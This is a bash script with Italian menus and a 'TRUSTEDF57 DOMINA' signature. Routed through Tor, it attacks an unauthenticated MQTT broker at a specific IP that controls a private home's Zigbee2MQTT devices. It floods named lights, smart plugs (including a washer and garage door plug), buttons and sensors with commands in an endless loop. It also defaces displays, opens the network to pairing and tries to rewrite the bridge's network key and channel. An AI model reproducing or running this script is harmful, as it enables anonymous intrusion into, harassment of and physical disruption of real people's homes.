#!/bin/bash

# Zigbee2MQTT Chaos Control v2.0 - TRUSTEDF57 DOMINA -PS FOLLOW MRBEAST!
# TARGET: 38.85.149.43:1883 (Connection 0 - NO AUTH)

MQTT_HOST="38.85.149.43"
MQTT_PORT="1883"
COUNTER=0

torsocks_mqtt() {
    ((COUNTER++))
    echo -e "\e[91m[$COUNTER]\e[0m \e[93mTORSOX → \e[92m$MQTT_HOST:$MQTT_PORT\e[0m \e[96m$1\e[0m"
    torsocks mosquitto_pub -h $MQTT_HOST -p $MQTT_PORT \
        -t "$1" -m "$2" -q 0 -r
}

deface_displays() {
    echo -e "\e[91m[DEFACE-$COUNTER]\e[0m \e[95m📺 DISPLAY HACK - TRUSTEDF57 DOMINA!\e[0m"
    
    # Home Assistant Lovelace/Dashboard override
    torsocks_mqtt "homeassistant/panel/override" '{"state":"hacked","message":"TRUSTEDF57 DOMINA -PS FOLLOW MRBEAST!"}'
    
    # Zigbee screens/displays (night lights, FP1 screens)
    torsocks_mqtt "zigbee2mqtt-5/Zigbee Plus Network 2 Master Bath Master Bathroom Smart Night Light/set" '{"state":"ON","brightness":255,"color":{"x":0.3,"y":0.6},"effect":"F57"}'
    
    torsocks_mqtt "zigbee2mqtt/Zigbee Plus 1st Floor Hall 1st Floor Hallway Night Light/set" '{"state":"ON","brightness":255,"color":{"hue":0},"effect":"scroll"}'
    
    # Bridge config per screens
    torsocks_mqtt "zigbee2mqtt/bridge/config" '{"permit_join":true,"led_invert":true,"screen_text":"TRUSTEDF57 DOMINA"}'
    torsocks_mqtt "zigbee2mqtt-5/bridge/config" '{"permit_join":true,"led_invert":true,"screen_text":"PS FOLLOW MRBEAST!"}'
    torsocks_mqtt "zigbee2mqtt-3/bridge/config" '{"permit_join":true,"led_invert":true,"screen_text":"F57 HACKED"}'
    
    # FP1 Motion screens (se supportano overlay)
    torsocks_mqtt "zigbee2mqtt/Zigbee Plus Office Aqara FP1 Office Motion Sensor/set" '{"overlay":"TRUSTEDF57 DOMINA","brightness":100}'
}

blink_all_lights() {
    echo -e "\e[91m[LAMPEGGIO-$COUNTER]\e[0m \e[93m💡 TUTTE LE LUCI BLINK LOOP!\e[0m"
    
    lights=(
        "zigbee2mqtt/Zigbee Plus Living Room Living Room Dresser Lamp/set"
        "zigbee2mqtt/Zigbee Plus Foyer Foyer Lamp Bulb/set"
        "zigbee2mqtt-5/Zigbee Plus Network 2 2nd Floor Hall 2nd Floor Hallway Lamp/set"
        "zigbee2mqtt/Zigbee Plus Kitchen Kitchen Sink Light Bulb/set"
        "zigbee2mqtt/Zigbee Plus Dining Room Dining Room Lamp/set"
        "zigbee2mqtt-5/Zigbee Plus Network 2 Master Bedroom L Night Stand Smart Plug/set"
        "zigbee2mqtt/Zigbee Plus Foyer Foyer Lamp/set"
        "zigbee2mqtt/Zigbee Plus Office Office Lamp/set"
        "zigbee2mqtt/Zigbee Plus 2nd Floor Hall 2nd Floor Hall Lamp/set"
        "zigbee2mqtt/Zigbee Plus Living Room Living Room Dresser Lamp Smart Plug/set"
        "zigbee2mqtt/Zigbee Plus Foyer Foyer Lamp Smart Plug/set"
        "zigbee2mqtt/Zigbee Plus Garage OH Door Garage Overhead Door Smart Plug/set"
        "zigbee2mqtt/Zigbee Plus Master Bedroom Master Bedroom Desk Lamp S/P/set"
        "zigbee2mqtt-5/Zigbee Plus Network 2 Master Bath Master Bathroom Smart Night Light/set"
        "zigbee2mqtt/Zigbee Plus 1st Floor Hall 1st Floor Hallway Night Light/set"
        "zigbee2mqtt/Zigbee Plus Kitchen Aqara Kitchen Sink Light Bulb/set"
        "zigbee2mqtt/Zigbee Plus Dining Room Dining Room Lamp Smart Plug/set"
        "zigbee2mqtt-5/Zigbee Plus Network 2 2nd Floor Hall 2nd Floor Hallway Nightlight Smart Plug/set"
        "zigbee2mqtt/Zigbee Plus Stair Closet Stair Closet Light Bulb/set"
        "zigbee2mqtt/Zigbee Plus Foyer Foyer Lamp Bulb/set"
    )
    
    # Blink loop infinito
    for i in {1..50}; do
        for light in "${lights[@]}"; do
            torsocks_mqtt "$light" '{"state":"ON","brightness":255,"transition":0.05}' &
        done
        sleep 0.3
        for light in "${lights[@]}"; do
            torsocks_mqtt "$light" '{"state":"OFF","brightness":0,"transition":0.05}' &
        done
        sleep 0.3
    done &
}

open_close_all() {
    echo -e "\e[91m[APRI-CHIUDI-$COUNTER]\e[0m \e[93m🚪 TUTTE PORTE/FINESTRE!\e[0m"
    
    doors=(
        "zigbee2mqtt-5/Zigbee Plus J&J Bathroom Aqara J&J Bath Toilet and Shower Door"
        "zigbee2mqtt-3/Zigbee Plus Garage Garage O/H Door Top Tilt Sensor"
        "zigbee2mqtt-3/Zigbee Plus Garage Garage O/H Door Bottom Tilt Sensor"
        "zigbee2mqtt/Zigbee Plus Front Entry Front Entry Door Sensor"
        "zigbee2mqtt/Zigbee Plus 1/2 Bath Aqara 1/2 Bath Door Sensor"
        "zigbee2mqtt/Zigbee Plus Stair Closet Aqara Stair Closet Door Switch"
        "zigbee2mqtt-5/Zigbee Plus Network 2 J&J Bathroom J&J Bathroom Shower Door Sensor"
        "zigbee2mqtt/Zigbee Plus Garage OH Door Garage O/H Door Top Tilt Sensor"
        "zigbee2mqtt/Zigbee Plus Kitchen Aqara Kitchen Glass Door Sensor"
    )
    
    for door in "${doors[@]}"; do
        torsocks_mqtt "$door" '{"contact":false}' &  # APERTO
        sleep 0.4
        torsocks_mqtt "$door" '{"contact":true}' &   # CHIUSO
    done
    wait
}

motion_chaos() {
    echo -e "\e[91m[MOTION-$COUNTER]\e[0m \e[93m👁️ FP1/FP1E FLOOD!\e[0m"
    
    fps=(
        "zigbee2mqtt-5/Zigbee Plus Network 2 Kitchen Aqara FP1E Kitchen Motion Sensor"
        "zigbee2mqtt/Zigbee Plus Office Aqara FP1 Office Motion Sensor"
        "zigbee2mqtt-3/Aqara Laundry Room Motion Sensor [Aqara FP1]E"
        "zigbee2mqtt/Zigbee Plus Garage Aqara FP1 Garage Motion Sensor"
        "zigbee2mqtt/Zigbee Plus Dining Room Aqara FP1 Dining Room Motion Sensor"
        "zigbee2mqtt-5/Zigbee Plus Network 2 1/2 Bath Aqara FP1 1/2 Bath Motion Sensor"
        "zigbee2mqtt/Zigbee Plus Kitchen Aqara FP1 Kitchen Motion Sensor"
    )
    
    for fp in "${fps[@]}"; do
        torsocks_mqtt "$fp" '{"occupancy":true,"illuminance":99999,"battery":1}' &
        torsocks_mqtt "$fp" '{"motion":true,"illuminance_lux":99999}' &
    done
    wait
}

button_spam() {
    echo -e "\e[91m[BUTTONS-$COUNTER]\e[0m \e[93m🔘 PULSANTI SPAM!\e[0m"
    
    buttons=(
        "zigbee2mqtt/Aqara Button 1" "zigbee2mqtt/Red Button"
        "zigbee2mqtt/Blue Button" "zigbee2mqtt-5/Blue Button"
    )
    
    for i in {1..20}; do
        for btn in "${buttons[@]}"; do
            torsocks_mqtt "$btn" '{"action":"single","click":"single"}' &
            torsocks_mqtt "$btn" '{"action":"double"}' &
            torsocks_mqtt "$btn" '{"action":"triple"}' &
            torsocks_mqtt "$btn" '{"action":"long_press"}' &
        done
        sleep 0.1
    done &
}

plugs_cycle() {
    echo -e "\e[91m[PRESE-$COUNTER]\e[0m \e[93m🔌 SMART PLUGS CYCLE!\e[0m"
    
    plugs=(
        "zigbee2mqtt-3/Zigbee Plus Network 3 Laundry Room Aqara Smart Plug [Washer]/set"
        "zigbee2mqtt-5/Zigbee Plus Network 2 Master Bedroom L Night Stand Smart Plug Master Bedroom L Night Stand Lamp/set"
        "zigbee2mqtt/Zigbee Plus Office Desk Fan Smart Plug/set"
        "zigbee2mqtt/Zigbee Plus Garage Work Bench Garage Work Bench Smart Plug/set"
        "zigbee2mqtt/Zigbee Plus Garage OH Door Garage O/H Door Smart Plug/set"
    )
    
    for plug in "${plugs[@]}"; do
        torsocks_mqtt "$plug" '{"state":"ON","brightness":255}' &
        sleep 0.5
        torsocks_mqtt "$plug" '{"state":"OFF"}' &
    done
    wait
}

bridge_overload() {
    echo -e "\e[91m[BRIDGE-$COUNTER]\e[0m \e[93m🌉 BRIDGE OVERLOAD!\e[0m"
    torsocks_mqtt "zigbee2mqtt/bridge/config" '{"permit_join":true,"led_invert":true,"pan_id":0xF57F}'
    torsocks_mqtt "zigbee2mqtt-3/bridge/config" '{"permit_join":true,"channel":25,"led_invert":true}'
    torsocks_mqtt "zigbee2mqtt-5/bridge/config" '{"permit_join":true,"network_key":"F57DOMINA","led_invert":true}'
    torsocks_mqtt "zigbee2mqtt/bridge/devices" '{"deface":"TRUSTEDF57"}'
}

show_menu() {
    clear
    echo -e "\e[91m╔══════════════════════════════════════════════════════╗"
    echo -e "║ \e[95m🎯 38.85.149.43:1883 \e[96m[\e[92m$COUNTER\e[96m]\e[0m \e[95mTRUSTEDF57 DOMINA!\e[0m ║"
    echo -e "╠══════════════════════════════════════════════════════╣"
    echo -e "║ \e[93mPS FOLLOW MRBEAST! - Zigbee2MQTT CHAOS v2.0\e[0m                 ║"
    echo -e "╠══════════════════════════════════════════════════════╣"
    echo -e "║ \e[92m1.\e[0m 💡 Lampeggio TUTTE luci (loop 50x)                    ║"
    echo -e "║ \e[92m2.\e[0m 🚪 Apri/Chiudi TUTTE porte (loop)                    ║"
    echo -e "║ \e[92m3.\e[0m 👁️  Motion FP1/FP1E FLOOD                           ║"
    echo -e "║ \e[92m4.\e[0m 🔘   Button spam infinito                            ║"
    echo -e "║ \e[92m5.\e[0m 🔌  Smart plugs ON/OFF cycle                          ║"
    echo -e "║ \e[92m6.\e[0m 📺  DEFACE displays + screens                         ║"
    echo -e "║ \e[92m7.\e[0m 🌉  Bridge config overload                            ║"
    echo -e "║ \e[92m8.\e[0m \e[91m💥 CHAOS TOTALE LOOP INFINITO\e[0m                      ║"
    echo -e "║ \e[92m0.\e[0m Reset counter                                        ║"
    echo -e "║ \e[92mQ.\e[0m Esci                                               ║"
    echo -e "╚══════════════════════════════════════════════════════╝\e[0m"
}

chaos_total() {
    echo -e "\e[91m💥 CHAOS TOTALE AVVIATO su 38.85.149.43!\e[0m"
    echo -e "\e[93mCtrl+C per fermare il massacro...\e[0m"
    
    while true; do
        deface_displays
        blink_all_lights &
        open_close_all
        motion_chaos
        button_spam &
        plugs_cycle
        bridge_overload
        echo -e "\e[91m🔥 Cycle #$COUNTER completato - F57 DOMINA!\e[0m"
        sleep 3
    done
}

while true; do
    show_menu
    read -p "🎯 Scelta: " choice
    
    case $choice in
        1) blink_all_lights ;;
        2) open_close_all ;;
        3) motion_chaos ;;
        4) button_spam ;;
        5) plugs_cycle ;;
        6) deface_displays ;;
        7) bridge_overload ;;
        8) chaos_total ;;
        0) COUNTER=0; echo -e "\e[92mCounter resettato!\e[0m" ;;
        q|Q) echo -e "\e[95mF57 DOMINA 38.85.149.43 - MISSIONE COMPLETATA!\e[0m"; exit 0 ;;
        *) echo -e "\e[91mOpzione sbagliata!\e[0m" ;;
    esac
    
    read -p $'\e[93mPremi INVIO per menu...\e[0m'
done
